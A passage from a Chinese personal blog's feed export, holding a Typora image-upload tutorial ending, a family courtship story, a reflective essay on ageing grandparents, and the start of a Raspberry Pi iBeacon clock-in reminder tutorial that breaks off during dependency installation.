Command，自定义命令就是我们插入图片后，Typora调用的命令。如刚才我们的脚本名称为upload.sh，自定义命令就可以设为<code>bash upload.sh</code>，注意替换upload.sh的路径为绝对路径。</p><center><img src="https://pic.gaficat.com/default/typora自定义图床偏好设置.png" alt="typora自定义图床偏好设置" style="zoom: 50%;" /></center><h2 id="测试是否正常"><a href="#测试是否正常" class="headerlink" title="测试是否正常"></a>测试是否正常</h2><p>完成脚本和偏好设置后，就可以测试脚本是否正常了。打开偏好设置，直接点击<code>验证图片上传选项</code>。</p><center><img src="https://pic.gaficat.com/default/typora验证图片上传选项.png" alt="typora验证图片上传选项" style="zoom:50%;" /></center><p>如果你看到下面这个久违的画面后，那么恭喜你，万事大吉。</p><center><img src="https://pic.gaficat.com/default/typora图片上传成功.png" alt="typora图片上传成功" style="zoom:50%;" /></center><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>市面上确实有很多功能丰富的Markdown编辑器，但所见即所得、小巧轻量的Typora依然是我最喜欢的。图片上传功能的加入，极大方便了写作的过程，想想之前，写文章需要手动将图片拖到图床APP，再把URL复制到文章中，就两个字，“繁琐”。</p><p>最后，用Typora写作，自定义命令上传图片，自己写一个脚本，十几行代码，卸载掉各种图床工具，插入图片直接<code>command + v</code>，写作原本就该这么简单嘛！</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>typora</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>幺舅是怎么追到舅妈的</title>
    <link href="/posts/a02d6da.html"/>
    <url>/posts/a02d6da.html</url>
    
    <content type="html"><![CDATA[<p>因为和女票分手了，所以五一回家休整两天。结果聊着聊着，麻麻就跟我聊幺舅追舅妈的故事了，我觉得实在是有趣，就记录下来吧。</p><h1 id="幺舅？何许人？"><a href="#幺舅？何许人？" class="headerlink" title="幺舅？何许人？"></a>幺舅？何许人？</h1><p>我有一个幺舅，是家里最小的，排行老五，人很高，身材很壮。喜欢打篮球、钓鱼的缘故，全身黝黑。平时话不是很多，主要是因为家里的其他舅舅和姨妈太能说了，身为老五的他，就整天被数落。怎么还没有对象，怎么还不成家，怎么有升职的机会自己没抓住。嗯，这里应该插一句嘴，我应该也和幺舅一样，被说的太多了，所以话也很少。</p><p>我印象里，过年特别喜欢回妈妈家过年，很大一部分因素，是因为幺舅。</p><blockquote><p>幺舅很舍得给我们买礼物。小时候看四驱兄弟，特别想要一辆四驱车，我至今记得，自己平时攒钱，一毛一毛的攒，攒了多久自己都忘记了。当时攒够了四块六，实在等不及了，就跑去小卖部，掏出一把毛票子，跟老板说，我只有四块六，能卖给我那个5块钱的四驱车吗？老板满脸不在乎的表情，“行行行”，数也不数，便把钱拨到柜子里，把四驱车递给我。我记得那是我第一辆四驱车，魔鬼司令。后来呢，春节回去，幺舅带我去街上买东西，看我望着街边玩具店里的四驱车，没说什么，直接就给我买了一个。我记得好像是30块钱。那辆车是跳跃者的外壳，我记得惊喜的拆开包装，看到有雪花纹的马达，满心惊喜。事实证明，车这玩意儿吧，越贵肯定越好呀！5块的四驱车，我还能跟在后面屁颠屁颠的跑，冲啊！魔鬼司令！哎哟，就这么中二。30的四驱车，我就只能看着它在地上跟老鼠一样乱窜，一脸无奈，太快了！</p></blockquote><blockquote><p>幺舅似乎很喜欢跟我们小孩子玩。我还记得幺舅偷偷带我去玩街机，我那时候小，只记得里面有一个BOSS，是机器人，跳起来，半蹲，手臂摆一个poss。后来回家了，我也跟在幺舅后面，学机器人的动作，幺舅看到我在学，也跟我一起笔画，看我们两个谁更像，然后笑的咯咯咯的。</p></blockquote><blockquote><p>幺舅很爱我们这帮小崽子们。我有一个表姐，有一次在学校被小混混调戏了。幺舅本身很壮，叫了一帮兄弟去学校堵小混混，在那之后，再没有人敢惹表姐。</p></blockquote><blockquote><p>幺舅至今都没考过驾照，不过喜欢骑摩托，我记得我上小学那会，他花了一万多块买了一辆摩托，那个时候爸爸的夏利车应该才几万块钱。所以幺舅成了整个县城最靓的仔，我特别喜欢坐在摩托后面，跟幺舅去兜风，虽然是真的抖，屁股是真滴麻，但是，真的拉风，可嘚瑟了。</p></blockquote><img src="https://pic.gaficat.com/default/嘚瑟的表情.jpg" alt="嘚瑟的表情" style="zoom:33%;" /><h1 id="闷骚的人骚起来，这还了得"><a href="#闷骚的人骚起来，这还了得" class="headerlink" title="闷骚的人骚起来，这还了得"></a>闷骚的人骚起来，这还了得</h1><p>我本身也是一个话少的人，我觉得我跟幺舅挺像的，所以家里人应该都挺为我们这种性格的人担心的，怕找不到女票。但是，我的舅妈，比我幺舅<strong>小了十几岁</strong>，而且，从认识到结婚，只有<strong>短短的两个月时间</strong>。所以，相信你也好奇，这老牛是咋吃上嫩草了的？</p><h2 id="缘分呐"><a href="#缘分呐" class="headerlink" title="缘分呐"></a>缘分呐</h2><p>有一天，我大舅在街上走着，看着街上有一家店，怎么店里比平时多了一个姑娘。那时候的小县城，人员流动很少，乡里乡亲的基本都认识，大舅就去打听，这姑娘哪来的呀？长得挺漂亮的，有没对象啊？能不能给幺舅介绍介绍？于是这一打听才知道，人家是从深圳回来的，休假回来玩两天。没错，这段姻缘就这么开始了。</p><h2 id="首战告负"><a href="#首战告负" class="headerlink" title="首战告负"></a>首战告负</h2><p>后来呢，当天就托熟人介绍，一起让幺舅和舅妈见一面，认识认识。舅妈后来跟我们说：“那时候，根本没看上你们幺舅，长得又黑，眼睛近视又没带眼镜，又是一个眯眯眼，哎，可真是。”</p><p>可是幺舅喜欢啊，这小了十几岁，这么年轻的小姑娘，当然喜欢啊！钻石王老五这么多年了！咋办呀，要电话呀！结果，虽然第一顿饭没舅妈没看上幺舅。但是，幺舅有朋友啊！</p><blockquote><p>“下午吃饭的那个男的，问你要电话，给吗？”</p><p>“那个人，长得又黑，眼睛又小，不行还是算了吧？”</p></blockquote><p>有些时候，身边有个能说会道，拉的下脸的朋友还是好啊，幺舅托的朋友，就开始软磨硬泡，你说这又不是给了电话就成了是不是？认识一下嘛，多个朋友多条路，巴拉巴拉。</p><p>总之啊，就还是把舅妈的电话要到手了。</p><h2 id="啥？我车票被取消了？"><a href="#啥？我车票被取消了？" class="headerlink" title="啥？我车票被取消了？"></a>啥？我车票被取消了？</h2><p>假期很快就过去了，舅妈准备回深圳工作了。谁也想不到，为了和舅妈多见几次，幺舅偷偷把舅妈回深圳的票退了。</p><p>由于县城交通闭塞，没有通火车，所以舅妈得先坐四个小时的汽车，到另一个县，才能倒火车去深圳。幺舅早早就打听好了，就提前安排朋友，来回开了8个小时车，偷偷把舅妈的车票退了。这舅妈知道了，也无奈啊，人家就想多和你待两天啊，没办法啊，那就再待两天吧。</p><p>后来呀，不会开车的幺舅，不可能骑摩托送舅妈去另一个县倒火车吧，就又借了朋友的车，把舅妈送上火车，这才算初次终了。</p><h2 id="煲得了电话粥才有爱啊"><a href="#煲得了电话粥才有爱啊" class="headerlink" title="煲得了电话粥才有爱啊"></a>煲得了电话粥才有爱啊</h2><p>舅妈回深圳了，幺舅就跟没魂了一样。咋办呀？聊天呗！那段时间，幺舅就天天上班挂着QQ，跟舅妈聊天。QQ不回，就短信继续聊。短信不尽兴，就煲电话粥。其实你很难想象，一个平时那么话说的男生，遇到了自己心仪的姑娘，能有那么多的话。幺舅那一个月，给舅妈打了<strong>3000块钱</strong>的电话。</p><p>我自己其实也深有体会，和有的姑娘，一晚上有的没的，能聊好多。和有的姑娘吧，每一秒钟都是煎熬，关键是，女生们还喜欢你跟她们聊，即使没话说，还逼着你打电话，这谁顶得住。所以呀，煲得了电话粥才是真爱呢。毕竟两口子在一起几十年，恋爱的时候都觉得没话说，那之后的几十年还怎么过？</p><h2 id="丈母娘总是一种可怕的生物"><a href="#丈母娘总是一种可怕的生物" class="headerlink" title="丈母娘总是一种可怕的生物"></a>丈母娘总是一种可怕的生物</h2><p>也许是被幺舅的真心感动了，后来舅妈就决定从深圳回去。虽然两个人相爱了，但是舅妈的家里人不同意啊！人长得五大三粗的，黑不溜秋，眼睛又小，这以后有了小崽子，可不也是这个怂样子？加上年龄又大，这大十几岁，都快喊人家爹了，还怎么嫁？</p><blockquote><p>其实，虽然幺舅形象上不是特别帅气的那种。但是人是真的不错，讲义气，大方，工作也好。在那个小县城，国家电网，也是相当有牌面了。舅妈如果回去，可能是没有正式工作的。</p></blockquote><p>舅妈当时说，那我不管，你们跟我好好说，我就跟你们好好说。你们不然我跟他过，越不让， 我就偏去反着来。结果，还是扭不过舅妈，丈母娘同意了。</p><h2 id="我幺舅的新娘可是从深圳专门为他跑回来的"><a href="#我幺舅的新娘可是从深圳专门为他跑回来的" class="headerlink" title="我幺舅的新娘可是从深圳专门为他跑回来的"></a>我幺舅的新娘可是从深圳专门为他跑回来的</h2><p>幺舅和舅妈的感情是美满的，我印象里是表姐说：“你们知道不，幺舅要结婚了，新娘可是专门从深圳跑回来，为了幺舅的！”那个时候大家都不知道，平时闷闷的幺舅，暗地里，还有这么一段追美人的经历呢。</p><p>现在呀，幺舅和舅妈有一个女儿一个儿子，女儿快上高中了，儿子也上小学了。舅妈也有了正式的工作，两个人的感情一直很好。舅妈现在说起这段往事，也还是很开心。因为在她自己的姊妹里面，过得是最好的，幸福是自己倔强出来的。</p><p>幺舅和舅妈的新房子今年也刚刚装修好，今天在新家做了第一顿饭，没错，就在我们家楼上。哈哈哈，从此和幺舅多了一个身份，邻居！</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>其实，和幺舅一样，每一个看似内向，看似话少，看似五大三粗的人，内心都是很温柔的。也许他的话少，只是针对不同的人。面对自己的挚爱，他嘴里有世界上最美的情话。</p><p>也不是讲什么大道理，毕竟自己也已经分手了。有谁想听听我的分手经验，来亲身试试不？不过，我还是一个相当理想主义的人，还是想说说我的看法。我认为一段感情，或者婚姻，两个人本身，是大过金钱或是其他东西的。就像幺舅和舅妈当初，舅妈不嫌弃幺舅丑，“话少”，幺舅也不嫌弃舅妈没有正式工作。即使家人反对，只要双方认准，对方是我要的人，对方能给我幸福，所有条件，在日后都能一起努力创造的，事实上也正是如此！要相信你的眼光，人，永远比冷冰冰的条件温暖靠谱。不然男女之间还谈什么恋爱？两家父母合计一下两家的状况，直接结婚呗？</p><p>工科的男生啊，通常家境本身都不是特别优越（也不至于贫寒，大部分是普通家庭吧），都是靠自己的努力，希望让家庭过的更好（你问我为啥？条件好的还搞什么IT，接老子的班啊！）。即使满身光环，清华北大的博士，生活也相当的艰辛，有许多的压力，这就是当今社会。这就是人往高处走，水往低处流。<strong>但是，希望看到这篇文章的你我，不卑不亢。依靠自己的努力，让自己在一个陌生的城市立足，让自己和自己的家庭过的更好，不丢人。希望你我，即使被生活的重担压得喘不过气，也还能相信爱情，能够用真心去面对另一半，想起TA，依然嘴角上扬，胸口温热。</strong></p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>当你老了，又成了谁的累赘</title>
    <link href="/posts/ee24dc2e.html"/>
    <url>/posts/ee24dc2e.html</url>
    
    <content type="html"><![CDATA[<p>又是我自己发牢骚的文章，通过博客推荐进来的直接<strong>command+w</strong>吧！</p>            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">            <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>            <script src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>            <meting-js  id="000hZcT11t4UWu" server="tencent" type="song" autoplay="false" mutex="true" listmaxheight="340px" preload="auto" theme="#ad7a86" loop="none"></meting-js><p>我是故事FM的忠实听众，之前听过一期关于社工介绍自己工作的节目，有的老人生活状况可以用毫无尊严形容——行动不便，满墙满地都是排泄物，人老了，活着的意义是什么。</p><h1 id="怎么突然想聊这个话题了"><a href="#怎么突然想聊这个话题了" class="headerlink" title="怎么突然想聊这个话题了"></a>怎么突然想聊这个话题了</h1><p>今天父亲联系我，给奶奶买一个轮椅，也不知道怎么，虽然和爷爷奶奶辈的亲人感情不是那么深，但心里还是挺难过的，因为印象里，奶奶除了腿脚不好，生活清淡，身体其实还行，没想到有些事来得比你想象得快，奶奶不仅腿脚不好，肺也不行了，完全走不了路了，这可能是我给奶奶买的最后几件东西了。我参加工作已经两年了，但除了工作上干的还不错以外，生活状态、心里状态、处理感情更多还是个孩子。主要是家里的长辈还把你当成孩子，你有得依靠，就不愿意去承担一些责任，当小孩子多好呀。</p><blockquote><p>前年春节，会奶奶家过年，除夕，父亲说：“你大伯今天要去街上置办一些东西，你也跟着去吧！”我心想，闲着也是闲着，就去呗。</p><p>“你知道你在家玩的好好的，为啥你爸要你跟我来不？”</p><p>“大概是各个地方过节都有一些不一样习俗吧，我们一直不老家这边生活，习俗什么的我都不清楚，以前都是大伯你们处理，我也是家里的男丁，这些事我得提前了解，以便未来逐渐接过你们手上的棒子吧？”</p><p>“哈哈哈哈哈哈，对！”</p></blockquote><blockquote><p>我小时候特别喜欢回妈妈家过年，因为回妈妈家，家里的长辈们会做一大桌子菜，一大家子十几号人，大家一起做一顿年夜饭，可不热闹。小孩子嘛，都喜欢热闹。</p><p>但是这两年，长辈们逐渐干不动了，腰不好，腿不好，关节炎，每个人都有每个人的毛病，明显感受到，这几年年夜饭，没有以前丰盛，人也没有以前齐了。长辈们开玩笑，这以后年夜饭呀，该你们这小辈们接手了，以后你们做成什么样子，我们就光跟着吃。那，同辈人中，年龄比较小的我，当然是，哥哥姐姐都不吭气，我就更不接茬了。没错，我们这一辈儿，哥哥姐姐们都是有小孩的人了，都还是小孩子的状态。我，女朋友都没谈呢，当个小孩的心态，就更心安理得了。</p></blockquote><p>就像上面的两个场景，其实许多时候，我已经意识到我需要转变自己的心态了。但是，人吧，总是习惯看别人。哥哥姐姐比我年长，尚且依然是小孩子模样，工作、家庭都靠着家里人。我，起码大学以后，所有事都相当独立，我靠着自己的努力，在一个陌生的城市立下足，我比他们成熟。可是啊，一个人的成熟很容易，一个人的生活本身就很平淡，过好自己一个人的生活很容易。困难的是，去承担起家庭的责任，成家、年夜饭、人情世故或是送走一些亲人。时间就是过得这么悄无声息，不知不觉，他们都老了。印象里，你还是小孩子，他们也依然健硕。然而，可能就是某一个瞬间，你突然就意识到，你的父辈们干不动了，你的爷爷辈们风烛残年了。你突然之间就没有人能依赖了，反而，他们逐渐的，要依赖你了，你需要挑起担子了，你不是小孩子了。当这一刻来临的时候，你是那么手足无措。</p><h1 id="假如我年少有为不自卑"><a href="#假如我年少有为不自卑" class="headerlink" title="假如我年少有为不自卑"></a>假如我年少有为不自卑</h1><p>今天看DannyData的视频，视频里，听着硅谷投资人vincent侃侃而谈，忽然觉得：同样都是这个年纪，为什么别人就可以911、特斯拉想买就买，掌握你这辈子都不会有财富。</p><p>我在想，如果我像他们一样，也年少有为，能够给我的家人提供最好的医疗条件；能不卑不亢，自信的面对工作和生活；能够吸引同样优秀的异性，和她成家，一起成长，担起家庭的重担。是不是一切不会像现在这么难，现在除了自己过得很舒服以外，无论是经济上还是其他方面，自己似乎都帮不上太多的忙。</p><p>是不是每个人，二十六七这个年纪，都已经承担起了家庭的责任呢？或者说，穷人的孩子早当家，用这种谎话来安慰自己。</p><h1 id="是不是只有经历一些离合才能长大"><a href="#是不是只有经历一些离合才能长大" class="headerlink" title="是不是只有经历一些离合才能长大"></a>是不是只有经历一些离合才能长大</h1><p>我高中时的一位同桌，是一个智商特别高、长得还挺帅的小伙。就是那种，不需要怎么努力，随便听听课，再复杂的数学题，拿过去就给你解的人。我印象特别深的一件事是，他为了给自己女票买蛋糕，省了一天的午饭，结果他看着女票吃蛋糕，自己饿得不行，不知不觉就啃起了蛋糕配的塑料勺。女生盯着他笑，说看你饿的，都开始啃勺子了，他呢，就嘿嘿一笑。</p><p>当然啦，他俩的事儿，班主任是知道的，只不过呢，班主任并不管，他俩成绩都不错。后来一次期中考试，他在旁边突然就啜泣起来，他说他外婆去世了。之后，我的记忆力里，只有他红着眼说他外婆和他感情特别深，我和班主任看着他女票陪他回家的背影。</p><p>在那之后呢？明显感觉他长大了，他不像以前那么无忧无虑了，变得多了几丝深沉。成绩还是和以前一样好，只是和女票分了手。现在呢，在国外，偶尔发发朋友圈，生活很自在。</p><h1 id="我的奶奶"><a href="#我的奶奶" class="headerlink" title="我的奶奶"></a>我的奶奶</h1><p>为什么想起高中同桌了，因为我清楚得记得，在他失去外婆最难过的日子里，他女票始终陪着他。其实挺羡慕他的，高中，双方父母都知道，同学们都知道，老师们也都知道，在最艰难的时刻，有人搀扶着。我呢，本来有着一个很懂事、温柔的女票，但因为一些事分开了。这个节骨眼儿上，奶奶唯一的心愿，是看她孙子结婚，然后盼着自己能看到重孙子，自己也就没有遗憾了。可是，我除了工作，一无所有，什么都处理不好。</p><p>其实，我和爷爷奶奶感情不深，为什么？我是爸爸妈妈带大的，我和爸爸妈妈生活在一个城市，爷爷奶奶生活在一个城市，外公生活在一个城市。所以没有长期一起生活的经历，必然不会有很深的感情。我印象里，奶奶有来我们的城市照顾我一段时间，有一次端午节，奶奶买了粽子，我咬了一口就说，怎么是白的，我要吃豆沙的。奶奶就带着咬了一口的粽子找老板，说能换成豆沙的不。没错，奶奶那辈人，省钱省习惯了，即使是8毛钱的粽子。</p><blockquote><p>我是妈妈一个人从小婴儿带到上学的，我听妈妈说，小时候因为我们生活在那种类似四合院的地方，妈妈是全职太太，所以并没有带我见太多人。有一次带我出去买菜，遇到熟人，别人叫了一下我的名字，我立马就躲到妈妈后面去了。我大概是从小，就有些自闭了？</p><p>所以啊，一个家庭，如果男生女生，都是一个人到这个城市，生活起来必定相当的困难，并且会对你们的孩子有一些影响。如果你们都很宅，不怎么懂社交的话。</p></blockquote><p>我不知道为什么，虽然和爷爷奶奶感情不是那么深。但可能是血缘关系，在他们生命的尽头，总想着满足他们的心愿。甚至于把他们的一些心愿，当成自己的使命或者任务。奶奶从盼着我上大学，到盼着我工作，如今生命的最后一段时间，盼着我带对象回家，但是，我怕是，哎，我不知道五一回去我要怎么圆我的谎。或者骗自己，满足老人的心愿，也是自己在主动从小孩子的状态转变出去，开始承担一些责任？</p><h1 id="我的爷爷"><a href="#我的爷爷" class="headerlink" title="我的爷爷"></a>我的爷爷</h1><p>我的爷爷很早就去世了，我的印象里，那天放学回家，爸爸妈妈都不见了，后来跟我打电话，说爷爷在家属院门口，跟别人起了冲突，突然心梗了。他们紧急会老家了，我因为要准备考试，等考完试再会老家。我就记得，放下电话，那个周末我整整打了两天街头篮球，然后通关了植物大战僵尸。我不知道那个时候为什么我那么痴迷游戏，可能我和大多数人不一样，大多数男生是上了大学才开始打游戏。我打游戏最疯狂的一段时间是初中高中，你敢想象整个高三，甚至于后来复读，我每周都还会雷打不动的玩LOL吗？</p><p>其实说起爷爷，我最清楚的记忆，是日记本上，08年10月29日。</p><blockquote><p>我和父亲坐出租车直接到了杨凌中学门口，刚好看到爷爷从巷子里出来，往大伯家去。事先没有告诉爷爷我们要回来，父亲说：“快去，给你爷爷一个惊喜。”我不知道哪里来了一股子劲儿，边跑边喊：“爷爷！爷爷！”爷爷愣住了，显然没反应过来，这哪个孙子喊我爷爷呢？我回头指了指刚下车的父亲，爷爷恍然大悟，“魏禾回来啦！”说着就重重的拍了拍我，虽然爷爷身体一直不好，但是那双有力的手，成了永恒的记忆。</p></blockquote><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>现在已经凌晨两点了，其实脑子不是很清醒，就突然觉得，奶奶也快要离开了，一切都来的这么快，自己没准备好，原本以为能满足她心愿的计划，现在看来也。</p><p>我想之后，我会选择一个很爱我的人，而不是一个条件很好的人。虽然站在父母的角度，条件好了，感情可以培养。条件不好，你的生活很艰难。但是我觉得，有爱，家和万事兴，条件也是可以培养的。更重要的是你年老的时候，子女离你远去，朋友早去了另一个世界。你的枕边人，不是爱你或者你爱之人，40年后哪还有什么条件好，没有爱，没有彼此包容的耐心，你成了谁的累赘，活着又有什么尊严呢？</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>总是忘打卡？用iBeacon提醒你！</title>
    <link href="/posts/edbd28cc.html"/>
    <url>/posts/edbd28cc.html</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>最近公司将打卡系统更换为了企业微信打卡，于是就出现了一个很麻烦的问题，<strong>忘打卡</strong>。企业微信虽然也有自动打卡，但是还是需要手动点开app，很多时候，我忘记的是手动在手机上点一下app这个过程。怎么提醒自己呢？我想过设闹钟，但是弹性工作制，上午8点到10点之间去公司都可以，只要打够9个小时的卡就行了。所以我什么时候到公司，时间是不确定的，闹钟肯定是不靠谱的，那怎么办呢？</p><p>理想情况下当然是<strong>基于地理位置提醒</strong>了，当我到达或离开公司的时候，能够自动提醒我打卡。我也确实做了尝试——IFTTT，但它的定位服务总是有一些问题，并且手机上一直开着定位服务耗电也是一个问题。所以手机app，基于定位提醒也无法实现了。当然了，我也想过其他的解决方案，比如在公司放一台扫描某个信号的设备，扫描如NFC、蓝牙之类的信号，就能判断我是否到达公司了。但NFC——距离太近，手机蓝牙——需要连接蓝牙耳机并不空闲，所以这个想法就一直搁置了。</p><p>后来无意间逛某宝，我看到了<strong>iBeacon信标</strong>，最终一个角落里的树莓派、一个iBeacon信标完美解决<strong>基于地理位置（我是否在公司）</strong>，提醒我打卡的问题。只要我人到达公司或者下班人离开公司，都会通过<a href="http://sc.ftqq.com/3.version">server酱</a>推送给微信，提醒自己打卡。因为有华米的手表，所以完全不用担心听不到通知的情况。</p><p>按照惯例，先上效果，手机上收到的提醒：</p><img src="https://pic.gaficat.com/default/image-20200426162508739.png" alt="打卡通知" style="zoom: 40%;" /><p>iBeacon信标就是这个白白的东西：</p><img src="https://pic.gaficat.com/default/iBeacon信标.jpg" alt="iBeacon信标" style="zoom: 25%;" /><p>树莓派躲在角落瑟瑟发抖：</p><img src="https://pic.gaficat.com/default/躲在角落的树莓派.jpg" alt="躲在角落的树莓派" style="zoom:25%;" /><h1 id="关于iBeacon"><a href="#关于iBeacon" class="headerlink" title="关于iBeacon"></a>关于iBeacon</h1><h2 id="何为iBeacon"><a href="#何为iBeacon" class="headerlink" title="何为iBeacon"></a>何为iBeacon</h2><p>Wikipedia这样说：</p><blockquote><p>iBeacon是苹果公司提出的“一种可以让附近手持电子设备检测到的一种新的低功耗、低成本信号传送器”的一套可用于室内定位系统的协议。</p></blockquote><p>当然啦，我在一开始看到这种解释的时候，也是蒙的。用人话来说：<strong>iBeacon是苹果推出的一种通信协议（通信协议有很多，比如HTTP），只不过它是基于低功耗蓝牙（BLE）通信的，应用的场景很多，比如室内定位、微信摇一摇周边。</strong></p><p>我们可以简单把iBeacon理解为两个角色，发送者（信标）和接收方。信标每隔一段时间，向周围发送广播——“我在这！”接收方在需要的时候，监听信标发送的内容，就能知道周围有几个iBeacon信标以及他们广播的内容了。信标只向外发送数据，不接收数据。接收方只接收数据，不向iBeacon节点发送数据。</p><p><img src="https://pic.gaficat.com/default/ibeacon-communication.jpg" alt="ibeacon-communication"></p><h2 id="iBeacon的优势"><a href="#iBeacon的优势" class="headerlink" title="iBeacon的优势"></a>iBeacon的优势</h2><h3 id="省电"><a href="#省电" class="headerlink" title="省电"></a>省电</h3><p>通常的无线通信协议，需要双方都监听某个信道，来回交换数据。比如我们常用的蓝牙（不是mesh蓝牙），分为主机和从机，我们很明显的感受是，两边都需要开启蓝牙，然后配对，再建立连接。这个过程其实就要求主机、从机都监听某个信道，以完成双向通信的过程。当然了，这种双向通信的需求在某些场景下是必要的，如蓝牙耳机、蓝牙键盘、蓝牙灯泡等。那主机、从机一直监听信道，必然很费电啊，某些场景就是需要省电怎么办呢？这就有了BLE（Bluetooth Low Energy），BLE省电的原理，就是双方协商，我们在某一个时间点一起监听信道收发数据，然后一起休眠一段时间，之后在某个时间点再一起醒过来监听信道收发数据。那都休眠了，当然就省电了。确实，BLE通过休眠，已经非常省电了，那还能不能更加省电呢？当然是可以的，某些场景下不需要双向通信，只需要单向通信，这时候就可以将省电做到极限。比如有这样一种场景，我希望测距，A节点不需要收数据，只需要发数据，B节点只需要监听A节点发射出的信号强度，计算距离就行了，那发数据的A节点不是就能节省大量因为监听信道而消耗的电能了？iBeacon实际上就是这样，iBeacon的信标就是A节点，只定时向外广播，不监听信道接收数据，非常省电。</p><h3 id="通信距离合适"><a href="#通信距离合适" class="headerlink" title="通信距离合适"></a>通信距离合适</h3><p>由于iBeacon基于BLE通信，而BLE通信的距离通常在几米到几十米之间，所以非常适合室内一个房间或者一个区域内的场景。其他的比如NFC，只有几厘米的识别范围，显然不是很合适打卡提醒这种场景。</p><h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><p>由于iBeacon本质是一种基于BLE通信协议，所以理论上所有大于蓝牙4.0的设备都可以支持iBeacon。</p><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>iBeacon信标不断向外广播数据，会不会泄露用户的隐私？我们以接收方为手机为例来做说明，下图就是一个典型的利用iBeacon的场景，从左至右，iBeacon信标广播了ID，手机收到广播的ID后，向云端请求这个ID对应的内容，云端再将ID对应的内容反馈给手机。在这个过程中，iBeacon的应用，只是信标向手机单向传输的ID信息而已（这个ID是可以自己定义的）。至于手机和云端通信是不是安全，这个就和iBeacon没有什么关系了。</p><p><img src="https://pic.gaficat.com/default/ibeacon%E5%AE%89%E5%85%A8%E6%80%A7.png" alt="iBeacon安全性"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>想使用iBeacon，还需要了解iBeacon广播的内容。我们试想这样一个场景，一家商场里面，两家店是邻居，其中一家无印良品，另一家是宜家，大家都希望用iBeacon信标广播自己店的信息来吸引顾客。那问题就来了，前面说iBeacon信标只是广播ID，那怎么区分两家店、两家店卖的商品、两家店所处的位置呢？答案就是iBeaon广播的内容。iBeacon信标向外广播的参数有三个：UUID、Major、Minor。这三个参数是可以自己配置，我们可以按照下图的方式来配置。怎么区分两家店呢？用UUID表示：<code>D9B9EC1F-3925-43D0-80A9-1E39D4CEA95C</code>表示无印良品，宜家设为其他的就行了。怎么区分店的地址呢？用Major表示：1表示旧金山，2表示巴黎，3表示伦敦。怎么区分商品呢？用Minor表示，10代表衣物、20代表厨房用品、30代表汽车用品。</p><p><img src="https://pic.gaficat.com/default/iBeacon_uuid.png" alt="iBeacon_uuid"></p><p>UUID就是类似上图长度的字符串，Major和Minor都是0-65535之间的整数。</p><h1 id="实现基于iBeacon的打卡提醒"><a href="#实现基于iBeacon的打卡提醒" class="headerlink" title="实现基于iBeacon的打卡提醒"></a>实现基于iBeacon的打卡提醒</h1><p>总体上的思路是：从某宝买来一个iBeacon信标，这个信标会自动定时向外广播相应内容，我用树莓派不断扫描周围iBeacon信标发出的广播数据，当第一次检测到iBeacon节点进入时，触发相应的告警，当检测到iBeacon节点离开时，同样触发告警就行了。</p><h2 id="硬件环境"><a href="#硬件环境" class="headerlink" title="硬件环境"></a>硬件环境</h2><ul><li>一个带有蓝牙且可以连接互联网的树莓派，目前4B、3B+、3B、3A和Zero W均符合要求。</li><li>一个iBeacon信标（某宝搜索iBeacon即可买到）。</li><li>一台安装了微信的手机，苹果、安卓都可以。</li></ul><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>我将代码整理到了<a href="https://github.com/scarleast/notify-by-ibeacon">github</a>，感兴趣的小伙伴可以直接拿去用，整体配置的步骤分为三大块：</p><ul><li>设置iBeacon信标</li><li>设置微信上的server酱（server酱是一款推送工具，借助微信，可以推送我们想要的通知）</li><li>设置树莓派</li></ul><h3 id="iBeacon信标"><a href="#iBeacon信标" class="headerlink" title="iBeacon信标"></a>iBeacon信标</h3><ul><li>配置并记录下好iBeacon信标的UUID、major、minor，另外，也记录下iBeacon信标的mac地址，用相应app配置就行了，这里不做详细说明。</li></ul><blockquote><p>通常我们买到的iBeacon信标都是附带配套APP，可以查看iBeacon信标的mac地址，并且配置UUID、major、minor这三个参数的，这三个参数其实可以随意配置的，如果不知道怎么配置，也可以使用默认的，只要记录下来就行了。需要注意的是，部分卖家不提供安卓配套的APP，自行选择合适的店家即可。</p></blockquote><h3 id="server酱"><a href="#server酱" class="headerlink" title="server酱"></a>server酱</h3><ul><li><p>记录server酱的SCKEY</p><blockquote><p>登录server酱的网站<a href="http://sc.ftqq.com/3.version%EF%BC%8C%E7%99%BB%E5%85%A5%E5%90%8E%E7%BB%91%E5%AE%9A%E5%BE%AE%E4%BF%A1%EF%BC%8C%E8%AE%B0%E5%BD%95%E4%B8%8BSCKEY%E5%B0%B1%E8%A1%8C%E4%BA%86">http://sc.ftqq.com/3.version，登入后绑定微信，记录下SCKEY就行了</a></p></blockquote></li></ul><h3 id="树莓派"><a href="#树莓派" class="headerlink" title="树莓派"></a>树莓派</h3><p>首先需要确保树莓派已经连接上了网络，之后通过ssh连接 树莓派或者打开图形界面下打开终端。</p><ul><li><p>安装所需要的依赖（使用到了python3）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get -y install python-dev libbluetooth-dev libcap2-bin git<br>sudo <span class="hljs-built_in">setcap</span> <span class="hljs-string">&#x27;cap_net_raw,cap_net_admin+eip&#x27;</span> $(readlink -f $(<span class="hljs-built_in">which</span> python))<br>sudo pip3 install 